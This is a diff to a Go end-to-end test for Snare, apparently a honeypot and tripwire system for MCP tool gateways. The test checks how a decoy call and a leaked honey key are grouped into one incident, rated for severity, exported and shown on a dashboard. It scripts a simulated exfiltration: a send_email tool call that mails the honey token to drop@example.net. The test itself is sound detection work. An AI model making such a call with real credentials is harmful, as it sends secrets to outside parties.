@@ -4,14 +4,22 @@ package server
 // scripted MCP server with real tools, talking to a real Snare server. An injected decoy
 // call and a honey key sent through a real tool are both touches, with the layer and one
 // session id, and the real tool still receives its call unchanged.
+//
+// It also covers the M7 exit criterion (docs/M7-incidents.md): the two touches form one
+// incident with stages recon, exfiltration; the egress touch is Critical on its own; and the
+// dashboard timeline shows both.
 
 import (
 	"bufio"
 	"bytes"
 	"context"
 	"encoding/json"
+	"fmt"
 	"io"
 	"log/slog"
+	"net/http"
+	"net/http/cookiejar"
+	"net/url"
 	"path/filepath"
 	"regexp"
 	"strings"
@@ -64,6 +72,9 @@ func TestEndToEndGateway(t *testing.T) {
 		AdminAddr: "127.0.0.1:0",
 		PublicURL: "http://cb.test",
 		DBPath:    filepath.Join(t.TempDir(), "snare.db"),
+
+		DashboardAddr: "127.0.0.1:0",
+		DashboardDev:  true,
 	}
 	s, err := Start(cfg, slog.New(slog.NewTextHandler(io.Discard, nil)))
 	if err != nil {
@@ -141,6 +152,16 @@ func TestEndToEndGateway(t *testing.T) {
 	if r := read(); !strings.Contains(r, "accepted") {
 		t.Fatalf("decoy reply: %s", r)
 	}
+	// The gateway reports touches asynchronously, so wait for this one to land before the
+	// next call; otherwise the two callbacks may arrive in either order.
+	for deadline := time.Now().Add(5 * time.Second); ; time.Sleep(50 * time.Millisecond) {
+		if ins, _ := c.Incidents(1); len(ins) == 1 {
+			break
+		}
+		if time.Now().After(deadline) {
+			t.Fatal("decoy call not recorded")
+		}
+	}
 
 	// 3. It then emails the honey key out through a real tool.
 	leak := `{"jsonrpc":"2.0","id":3,"method":"tools/call","params":{"name":"send_email","arguments":{"to":"drop@example.net","body":"key: ` + honey.Token + `"}}}`
@@ -188,7 +209,108 @@ func TestEndToEndGateway(t *testing.T) {
 		t.Fatal("no decoy tripwire recorded a touch")
 	}
 	tool := wait(decoyID, "tool")
-	if a, b := sessionRE.FindStringSubmatch(egress.Detail)[1], sessionRE.FindStringSubmatch(tool.Detail)[1]; a != b {
-		t.Errorf("touches from one gateway session carry different ids: %s vs %s", a, b)
+	session := sessionRE.FindStringSubmatch(egress.Detail)[1]
+	if b := sessionRE.FindStringSubmatch(tool.Detail)[1]; session != b {
+		t.Errorf("touches from one gateway session carry different ids: %s vs %s", session, b)
 	}
+
+	// M7: one incident, the decoy call then the leak, keyed by the gateway session.
+	if tool.Stage != store.StageRecon || egress.Stage != store.StageExfiltration || egress.Layer != store.LayerEgress ||
+		egress.Session != session || egress.IncidentID == 0 || egress.IncidentID != tool.IncidentID {
+		t.Fatalf("stages and incident: tool %+v, egress %+v", tool, egress)
+	}
+	ins, err := c.Incidents(10)
+	if err != nil || len(ins) != 1 {
+		t.Fatalf("incidents: %+v %v", ins, err)
+	}
+	if in := ins[0]; in.ID != tool.IncidentID || in.Session != session || in.Touches != 2 || in.Tripwires != 2 ||
+		strings.Join(in.Stages, ",") != "recon,exfiltration" {
+		t.Fatalf("incident: %+v", in)
+	}
+
+	// The egress touch is Critical, and says why; the alert carries the incident.
+	req, _ := http.NewRequest("GET", "http://"+s.AdminAddr+"/api/events/export", nil)
+	req.Header.Set("Authorization", "Bearer "+string(cfg.AdminKey))
+	res, err := http.DefaultClient.Do(req)
+	if err != nil {
+		t.Fatal(err)
+	}
+	dec := json.NewDecoder(res.Body)
+	var exported int
+	for dec.More() {
+		var a struct {
+			SeverityID int `json:"severity_id"`
+			Unmapped   struct {
+				EventID         int64    `json:"event_id"`
+				Stage           string   `json:"stage"`
+				IncidentID      int64    `json:"incident_id"`
+				SessionID       string   `json:"session_id"`
+				Stages          []string `json:"correlated_stages"`
+				CriticalBecause string   `json:"critical_because"`
+			} `json:"unmapped"`
+		}
+		if err := dec.Decode(&a); err != nil {
+			t.Fatal(err)
+		}
+		exported++
+		u := a.Unmapped
+		if u.IncidentID != egress.IncidentID || u.SessionID != session {
+			t.Errorf("exported finding %d: incident %d session %q", u.EventID, u.IncidentID, u.SessionID)
+		}
+		if u.EventID == egress.ID && (a.SeverityID != 5 || u.Stage != "exfiltration" || u.CriticalBecause == "" ||
+			strings.Join(u.Stages, ",") != "recon,exfiltration") {
+			t.Errorf("egress finding: severity %d %+v", a.SeverityID, u)
+		}
+	}
+	res.Body.Close()
+	if exported != 2 {
+		t.Fatalf("exported %d findings, want 2", exported)
+	}
+
+	// The dashboard timeline shows both touches with their stages, in order.
+	op := &admin.Client{BaseURL: c.BaseURL, Key: c.Key}
+	viewer, err := op.IssueKey(store.DefaultTenant, store.RoleViewer)
+	if err != nil {
+		t.Fatal(err)
+	}
+	page := dashboardPage(t, "http://"+s.DashboardAddr, viewer.Key, fmt.Sprintf("/incidents/%d", egress.IncidentID))
+	recon, exfil := strings.Index(page, ">recon<"), strings.Index(page, ">exfiltration<")
+	if !strings.Contains(page, "Incident #") || !strings.Contains(page, session) || recon < 0 || exfil < 0 {
+		t.Fatalf("incident page lacks the session or a stage:\n%s", page)
+	}
+	if tl := strings.Index(page, "Timeline"); tl < 0 || strings.Index(page[tl:], ">recon<") > strings.Index(page[tl:], ">exfiltration<") {
+		t.Errorf("timeline not in time order")
+	}
+}
+
+// dashboardPage signs in to the dashboard with key and returns the page at path.
+func dashboardPage(t *testing.T, base, key, path string) string {
+	t.Helper()
+	jar, _ := cookiejar.New(nil)
+	hc := &http.Client{Jar: jar, Timeout: 5 * time.Second}
+	res, err := hc.Get(base + "/login")
+	if err != nil {
+		t.Fatal(err)
+	}
+	body, _ := io.ReadAll(res.Body)
+	res.Body.Close()
+	m := regexp.MustCompile(`name="csrf" value="([^"]+)"`).FindSubmatch(body)
+	if m == nil {
+		t.Fatal("login page has no csrf field")
+	}
+	res, err = hc.PostForm(base+"/login", url.Values{"csrf": {string(m[1])}, "key": {key}})
+	if err != nil {
+		t.Fatal(err)
+	}
+	res.Body.Close()
+	res, err = hc.Get(base + path)
+	if err != nil {
+		t.Fatal(err)
+	}
+	defer res.Body.Close()
+	body, _ = io.ReadAll(res.Body)
+	if res.StatusCode != 200 {
+		t.Fatalf("GET %s: %d %s", path, res.StatusCode, body)
+	}
+	return string(body)
 }
